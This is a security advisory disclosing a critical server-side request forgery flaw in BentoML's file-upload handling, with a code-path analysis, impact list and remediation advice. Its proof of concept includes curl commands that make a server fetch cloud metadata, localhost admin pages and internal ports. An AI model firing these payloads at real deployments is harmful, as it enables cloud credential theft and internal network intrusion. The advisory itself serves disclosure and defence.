# BentoML SSRF Vulnerability in File Upload Processing  

**GHSA**: GHSA-mrmq-3q62-6cc8 | **CVE**: CVE-2025-54381 | **Severity**: critical (CVSS 9.9)

**CWE**: CWE-918

**Affected Packages**:
- **bentoml** (pip): >= 1.4.0, < 1.4.19

## Description

### Description

There's an SSRF in the file upload processing system that allows remote attackers to make arbitrary HTTP requests from the server without authentication. The vulnerability exists in the serialization/deserialization handlers for multipart form data and JSON requests, which automatically download files from user-provided URLs without proper validation of internal network addresses.

The framework automatically registers any service endpoint with file-type parameters (`pathlib.Path`, `PIL.Image.Image`) as vulnerable to this attack, making it a framework-wide security issue that affects most real-world ML services handling file uploads. While BentoML implements basic URL scheme validation in the `JSONSerde` path, the `MultipartSerde` path has no validation whatsoever, and neither path restricts access to internal networks, cloud metadata endpoints, or localhost services.

The documentation explicitly promotes this URL-based file upload feature, making it an intended but insecure design that exposes all deployed services to SSRF attacks by default.

### Source - Sink Analysis

**Source:** User-controlled multipart form field values and JSON request bodies containing URLs

**Call Chain - Path 1 (MultipartSerde - No Validation):**
1. HTTP POST request with multipart form data to any BentoML endpoint with file-type input parameters  
2. `MultipartSerde.parse_request()` in `src/_bentoml_impl/serde.py:202` processes the request
3. `form = await request.form()` parses multipart data using Starlette
4. For file-type fields: `value = [await self.ensure_file(v) for v in form.getlist(k)]` at line 209
5. `MultipartSerde.ensure_file()` called at lines 186-200 with user-controlled string URL
6. **Sink:** `resp = await client.get(obj)` at line 193 - Direct HTTP request with zero validation

**Call Chain - Path 2 (JSONSerde - Weak Validation):**  
1. HTTP POST request with JSON body containing URL to endpoint with `IORootModel` + `multipart_fields`
2. `JSONSerde.parse_request()` in `src/_bentoml_impl/serde.py:157` processes the request
3. `body = await request.body()` extracts request body
4. Condition check: `if issubclass(cls, IORootModel) and cls.multipart_fields:` at line 164
5. Weak validation: `if is_http_url(url := body.decode("utf-8", "ignore")):` at line 165 (only checks scheme)
6. **Sink:** `resp = await client.get(url)` at line 168 - HTTP request after insufficient validation

### Proof of Concept

Create a BentoML service:
```python
from pathlib import Path
import bentoml

@bentoml.service  
class ImageProcessor:
    @bentoml.api
    def process_image(self, image: Path) -> str:
        return f"Processed image: {image}"
```

Deploy and exploit:
```bash
# Start service (binds to 0.0.0.0:3000 by default)
bentoml serve service.py:ImageProcessor

# SSRF Attack 1 - Access AWS metadata  
curl -X POST http://target:3000/process_image \
     -F 'image=http://169.254.169.254/latest/meta-data/'

# SSRF Attack 2 - Internal service enumeration
curl -X POST http://target:3000/process_image \  
     -F 'image=http://localhost:8080/admin'

# SSRF Attack 3 - Internal network scanning
curl -X POST http://target:3000/process_image \
     -F 'image=http://10.0.0.1:22'
```

Expected result: Server makes HTTP requests to internal/cloud endpoints, potentially returning sensitive data in error messages or logs.

### Impact
- Access AWS/GCP/Azure cloud metadata services for credential theft
- Enumerate and interact with internal HTTP services and APIs  
- Bypass firewall restrictions to reach internal network resources
- Perform network reconnaissance from the server's perspective
- Retrieve sensitive information disclosed in HTTP response data
- Potential for internal service exploitation through crafted requests

### Remediation  

Implement comprehensive URL validation in both serialization paths by adding network restriction checks to prevent access to internal/private network ranges, localhost, and cloud metadata endpoints. The existing `is_http_url()` function should be enhanced to include allowlist validation rather than just scheme checking.
